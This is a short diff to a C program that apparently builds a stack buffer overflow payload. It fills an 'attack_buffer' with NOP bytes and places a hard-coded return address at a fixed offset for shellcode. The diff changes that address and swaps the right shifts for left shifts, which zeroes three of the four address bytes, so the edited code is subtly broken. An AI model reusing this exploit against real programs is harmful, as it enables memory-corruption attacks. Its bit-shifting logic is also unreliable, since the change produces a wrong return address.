@@ -9,7 +9,7 @@
 #define SHELL_SIZE 45
 #define BUF_TO_RET 120
 #define BUF_SIZE 125
-#define BUF_ADDR 0x20211110
+#define BUF_ADDR 0x2021fe10
 
 int
 main ( int argc, char * argv[] )
@@ -23,9 +23,9 @@ main ( int argc, char * argv[] )
 		attack_buffer[i] = 0x90;
 
 	attack_buffer[BUF_TO_RET + 3] = (unsigned char) (BUF_ADDR & 0x000000ff);
-	attack_buffer[BUF_TO_RET + 2] = (unsigned char) ((BUF_ADDR >> 8) & 0xff);
-	attack_buffer[BUF_TO_RET + 1] = (unsigned char) ((BUF_ADDR >> 16) & 0x000000ff);
-	attack_buffer[BUF_TO_RET] = (unsigned char) (BUF_ADDR >> 24);
+	attack_buffer[BUF_TO_RET + 2] = (unsigned char) ((BUF_ADDR << 8) & 0xff);
+	attack_buffer[BUF_TO_RET + 1] = (unsigned char) ((BUF_ADDR << 16) & 0x000000ff);
+	attack_buffer[BUF_TO_RET] = (unsigned char) (BUF_ADDR << 24);
 	attack_buffer[BUF_TO_RET + 4] = '\0';
 
 	printf("attack_buffer %s\n",attack_buffer);
